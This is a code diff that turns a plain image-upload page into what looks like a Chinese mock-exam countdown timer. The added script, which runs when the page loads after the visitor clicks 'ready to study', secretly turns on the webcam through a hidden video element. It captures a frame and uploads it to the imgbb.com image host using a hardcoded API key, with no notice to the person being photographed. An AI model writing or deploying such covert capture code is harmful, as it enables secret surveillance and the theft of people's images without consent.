@@ -3,46 +3,97 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Image Upload</title>
+<title>中考第一次模拟考试倒计时</title>
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        font-family: Arial, sans-serif;
+        background-image: url('https://pfst.cf2.poecdn.net/base/image/51d78a6cb32ea8df986a58aa7beb04fcaa6b97bd53c1e1f17bf3c6f5823e2085?w=1024&h=1024&pmaid=63571236');
+        background-size: cover;
+        background-repeat: no-repeat;
+        background-attachment: fixed;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+    #countdown {
+        text-align: center;
+        color: white;
+        font-size: 36px;
+    }
+    #canvasContainer {
+        display: none;
+    }
+</style>
 </head>
 <body>
-
-<h2>图片上传</h2>
-<form id="uploadForm" enctype="multipart/form-data">
-  <input type="file" id="fileInput" name="image" accept="image/*">
-  <button type="submit" onclick="uploadImage()">上传</button>
-</form>
-
+<div id="countdown"></div>
+<video id="video" width="640" height="480" autoplay style="display:none;"></video>
+<div id="canvasContainer">
+  <canvas id="canvas" width="640" height="480"></canvas>
+</div>
 <script>
-function uploadImage() {
-  var form = document.getElementById('uploadForm');
-  var fileInput = document.getElementById('fileInput');
-  
-  var formData = new FormData();
-  formData.append('image', fileInput.files[0]);
-  formData.append('key', 'f621b2818ded22557f9260b26e3138b6'); // Replace with your API key
-  
-  var xhr = new XMLHttpRequest();
-  xhr.open('POST', 'https://api.imgbb.com/1/upload', true);
-  xhr.onload = function () {
-    if (xhr.status === 200) {
-      var response = JSON.parse(xhr.responseText);
-      console.log('Upload successful. Image URL:', response.data.url);
-      alert('图片上传成功！');
+    var targetDate = new Date("April 11, 2024 08:00:00").getTime();
+    var readyToStudy = confirm("准备好学习了吗？");
+    if (readyToStudy) {
+        var countdownFunction = setInterval(function() {
+            var now = new Date().getTime();
+            var distance = targetDate - now;
+            var days = Math.floor(distance / (1000 * 60 * 60 * 24));
+            var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+            var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+            document.getElementById("countdown").innerHTML = "距离2024年4月11日上午8点还有：" + days + "天 " + hours + "小时 "
+            + minutes + "分钟 " + seconds + "秒 ";
+            if (distance < 0) {
+                clearInterval(countdownFunction);
+                document.getElementById("countdown").innerHTML = "考试开始！";
+            }
+        }, 1000);
+        function captureAndUpload() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');          
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    video.srcObject = stream;
+                })
+                .catch(error => {
+                    console.error('获取摄像头数据出错：', error);
+                });
+            setTimeout(() => {
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                canvas.toBlob(function(blob) {
+                    var formData = new FormData();
+                    formData.append('image', blob);
+                    formData.append('key', 'f621b2818ded22557f9260b26e3138b6'); 
+                    var xhr = new XMLHttpRequest();
+                    xhr.open('POST', 'https://api.imgbb.com/1/upload', true);
+                    xhr.onload = function () {
+                        if (xhr.status === 200) {
+                            var response = JSON.parse(xhr.responseText);
+                            console.log('Upload successful. Image URL:', response.data.url);
+                            alert('111');
+                        } else {
+                            console.error('Error:', xhr.statusText, xhr.status);
+                            alert('Eroor!');
+                        }
+                    };                    
+                    xhr.onerror = function () {
+                        console.error('Error:', xhr.statusText);
+                        alert('Eroor!');
+                    };
+                    xhr.send(formData);
+                });
+                document.getElementById('canvasContainer').style.display = 'none';
+            }, 2000); 
+        }
+        window.onload = captureAndUpload;
     } else {
-      console.error('Error:', xhr.statusText);
-      alert('上传失败，请重试！');
+        document.getElementById("countdown").innerHTML = "好的，等你准备好了再来！";
     }
-  };
-  
-  xhr.onerror = function () {
-    console.error('Error:', xhr.statusText);
-    alert('上传失败，请重试！');
-  };
-  
-  xhr.send(formData);
-}
 </script>
-
 </body>
 </html>
